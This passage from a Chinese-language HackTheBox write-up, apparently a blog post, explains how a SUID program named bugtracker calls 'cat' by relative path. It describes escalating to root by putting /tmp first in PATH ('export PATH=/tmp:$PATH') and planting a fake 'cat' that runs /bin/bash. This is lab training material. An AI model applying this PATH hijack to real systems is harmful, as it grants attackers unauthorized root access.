+<p>该程序根据输入执行<code>cat /root/reports/xxx</code>,注意到这里的<code>cat</code>可能为相对路径,因此可能可以利用<code>SUID</code>进行提权操作</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142011724.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142011724.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142011724.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142011724.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142011724.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142011724.png" /></p>
+<p>确实是直接使用了相对路径的<code>cat</code>,因此可以进行提权操作</p>
+<p>改变当前目录的<code>PATH</code>,使<code>robert</code>执行<code>bugtracker</code>时优先使用当前的<code>PATH</code>变量</p>
+<p>假设将<code>PATH</code>设置为<code>/tmp</code>目录,而在<code>/tmp</code>目录下存在一个名为<code>cat</code>的可执行文件,文件内容为<code>/bin/bash</code>,在执行<code>bugtracker</code>会以<code>root</code>权限执行<code>/bin/bash</code>由此获得<code>root shell</code></p>
+<p><code>export PATH=/tmp:$PATH</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142017367.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142017367.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142017367.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142017367.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142017367.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142017367.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142018460.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142018460.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142018460.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142018460.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142018460.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142018460.png" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-01-09</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/htb-horizontall/" class="prev" rel="prev" title="HackTheBox-Horizontall"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox-Horizontall</a>
+            <a href="/htb-pandora/" class="next" rel="next" title="HackTheBox-Pandora">HackTheBox-Pandora<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Mi3aka</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
